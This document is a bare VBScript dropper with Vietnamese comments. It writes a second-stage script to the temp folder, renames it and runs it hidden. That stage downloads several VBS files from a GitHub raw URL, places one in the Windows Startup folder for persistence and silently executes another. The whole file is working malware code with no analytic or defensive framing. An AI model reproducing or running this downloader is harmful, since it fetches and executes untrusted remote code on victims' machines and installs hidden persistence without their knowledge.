Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
temp = shell.ExpandEnvironmentStrings("%TEMP%")
startup = shell.SpecialFolders("Startup")

' Ghi nội dung VBS vào hehe.txt
txtPath = temp & "\hehe.txt"
Set file = fso.CreateTextFile(txtPath, True)
file.WriteLine "Dim shell, fso, tempFolder, startupFolder" & vbCrLf & "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf & "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & "tempFolder = shell.ExpandEnvironmentStrings(""%TEMP%"") & ""\""" & vbCrLf & "startupFolder = shell.ExpandEnvironmentStrings(""%APPDATA%"") & ""\Microsoft\Windows\Start Menu\Programs\Startup\""" & vbCrLf & "url1 = ""https://raw.githubusercontent.com/2UY5/2/refs/heads/main/1notext.vbs""" & vbCrLf & "url2 = ""https://raw.githubusercontent.com/2UY5/2/refs/heads/main/2.vbs""" & vbCrLf & "url3 = ""https://raw.githubusercontent.com/2UY5/2/refs/heads/main/3.vbs""" & vbCrLf & "urlup = ""https://raw.githubusercontent.com/2UY5/2/refs/heads/main/startup""" & vbCrLf & "txt1 = tempFolder & ""1.txt""" & vbCrLf & "txt2 = tempFolder & ""2.txt""" & vbCrLf & "txt3 = tempFolder & ""3.txt""" & vbCrLf & "txtup = startupFolder & ""startup.txt""" & vbCrLf & "vbs1 = tempFolder & ""1.vbs""" & vbCrLf & "vbs2 = tempFolder & ""2.vbs""" & vbCrLf & "vbs3 = tempFolder & ""3.vbs""" & vbCrLf & "vbsup = startupFolder & ""startup.vbs""" & vbCrLf & "Function DownloadFile(url, savePath)" & vbCrLf & "    Dim http, stream" & vbCrLf & "    Set http = CreateObject(""WinHttp.WinHttpRequest.5.1"")" & vbCrLf & "    http.Open ""GET"", url, False" & vbCrLf & "    http.Send" & vbCrLf & "    If http.Status = 200 Then" & vbCrLf & "        Set stream = CreateObject(""ADODB.Stream"")" & vbCrLf & "        stream.Type = 1 ' binary" & vbCrLf & "        stream.Open" & vbCrLf & "        stream.Write http.responseBody" & vbCrLf & "        stream.SaveToFile savePath, 2" & vbCrLf & "        stream.Close" & vbCrLf & "        DownloadFile = True" & vbCrLf & "    Else" & vbCrLf & "        DownloadFile = False" & vbCrLf & "    End If" & vbCrLf & "End Function" & vbCrLf & "DownloadFile url1, txt1" & vbCrLf & "DownloadFile url2, txt2" & vbCrLf & "DownloadFile url3, txt3" & vbCrLf & "DownloadFile urlup, txtup" & vbCrLf & "If fso.FileExists(vbs1) Then fso.DeleteFile vbs1, True" & vbCrLf & "If fso.FileExists(vbs2) Then fso.DeleteFile vbs2, True" & vbCrLf & "If fso.FileExists(vbs3) Then fso.DeleteFile vbs3, True" & vbCrLf & "If fso.FileExists(vbsup) Then fso.DeleteFile vbsup, True" & vbCrLf & "fso.MoveFile txt1, vbs1" & vbCrLf & "fso.MoveFile txt2, vbs2" & vbCrLf & "fso.MoveFile txt3, vbs3" & vbCrLf & "fso.MoveFile txtup, vbsup" & vbCrLf & "shell.Run ""wscript.exe """""" & vbs3 & """""""", 0, False"
file.Close

' Đổi tên hehe.txt thành hehe.vbs
vbsPath = temp & "\hehe.vbs"
If fso.FileExists(vbsPath) Then fso.DeleteFile vbsPath, True
fso.MoveFile txtPath, vbsPath


' Chạy file hehe.vbs
shell.Run """" & vbsPath & """", 0, False
